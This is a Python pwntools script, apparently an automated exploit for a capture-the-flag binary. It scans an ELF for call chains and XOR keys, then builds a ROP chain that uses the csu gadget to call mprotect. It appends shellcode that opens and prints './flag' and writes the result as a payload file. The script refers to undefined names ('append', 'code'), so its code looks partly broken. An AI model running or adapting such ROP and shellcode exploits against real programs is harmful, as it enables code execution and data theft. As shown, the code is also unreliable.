#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.
from pwn import *
import random, string, subprocess, os, sys

context.log_level="error"
context.arch="amd64"

def read_until(fd, max_sz, end_ch = None):
    data = ''
    while len(data) < max_sz:
        try:
            tch = fd.read(1)
        except Exception, e:
            break  

        if end_ch != None and tch == end_ch:
            break

        if tch == '':
            break      
        data += tch
        #print data
    return data

def exec_serv(name,out):
    p = subprocess.Popen(name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdin.write(out)
    return read_until(p.stdout, 0x1000,'\n')

elf = ELF(sys.argv[1])
start = elf.entry
main = u32(elf.read(start+0x20,4))
mark = asm("mov esi,ecx;mov edi,eax;")+"\xe8"
bug1_it = min([ i - main for i in list(elf.search(mark)) if i > main ]) + main + 4
bug1 = (u32(elf.read(bug1_it+1,4)) + bug1_it + 5)&0xffffffff

bug_check = [bug1]
for i in range(0x10):
    data = elf.read(bug_check[-1],0x100)
    it = 0
    for l in range(len(data)):
        if data[l] == '\xe8' and data[l+5] == '\x90':
            it = l
            break
    it +=bug_check[-1]
    bug_check.append((u32(elf.read(it+1,4)) + it + 5)&0xffffffff)

last3_bug = bug_check[-1]
big=[last3_bug]
for i in range(3):
    data = elf.read(big[-1],0x1000)
    it = 0
    for l in range(len(data)):
        if data[l] == '\xe8' and data[l+5] == '\x90':
            it = l
            break
    it +=big[-1]
    big.append((u32(elf.read(it+1,4)) + it + 5)&0xffffffff)

endend = elf.read(u32(elf.read(big[-1]+0x16,4))+big[-1]+0x1a,8)
stack_depth = ord(elf.read(big[-1]+7,1))
byte_addr = u32(elf.read(big[-1]+0xb,4))+big[-1]+0xe

mark = "\x83\xf0"
tmp = [i for i in list(elf.search(mark)) if i > main and i <  bug1_it]
xor0 = ord(elf.read(tmp[0]+2,1))
xor1 = ord(elf.read(tmp[1]+2,1))
bug_off = map(str,map(elf.vaddr_to_offset,bug_check))

cmd = "./a3.out %s"%sys.argv[1]
prefix = exec_serv(cmd,"\n".join(bug_off)+"\n")
latter = exec_serv("./a.out %s %s"%(sys.argv[1],bug_off[-1]),"")

def xor_data(s,k1,k0):
    d = ""
    for i in range(len(s)):
        d+=chr(ord(s[i]) ^ (k1 if i&1 else k0))
    return d.encode("hex")
csu = next(elf.search(asm("pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15",arch="amd64")))

append1 = """
    call here
    .string "hello,world"
here:
    pop rsi
    mov rdx,0x100
    mov rdi,1
    mov rax,SYS_write
    syscall
    mov rax,SYS_open
    call file
    .string "./flag"
    file:
    pop rdi
    xor rsi,rsi
    syscall
    mov rsi,rsp
    mov rdx,0x100
    mov rdi,rax
    mov rax,SYS_read
    syscall
    mov rsi,rsp
    mov rdx,0x100
    mov rdi,1
    mov rax,SYS_write
    syscall
"""
append_code = asm(append,arch="amd64")
sec_code = ""
for i in range(0,len(append_code),4):
    sec_code+= p32((u32(append_code[i:i+4].ljust(4,'\x00'))-0x66666666)&0xffffffff)
#sec_code = append_code
shellcode = asm(code,arch="amd64").ljust(0x30,"\x90")
shellcode += sec_code
nop = list(elf.search(asm("ret",arch="amd64")))[1]
rop = flat(
    "a"*7+p64(nop)*20
    ,csu,0,1,elf.got["mprotect"],(byte_addr&0xfffff000)-0x1000,0x3000,7,csu-0x1A,
    "a"*0x38,byte_addr+0x100+0xa+0x27,
).ljust(0x100,"\x00")+shellcode

payload = xor_data((prefix+latter).decode("hex")+endend+"\x00"+rop,xor1,xor0)
#print prefx
#print latter
with open("input","w+") as f:
    f.write(payload)
print payload









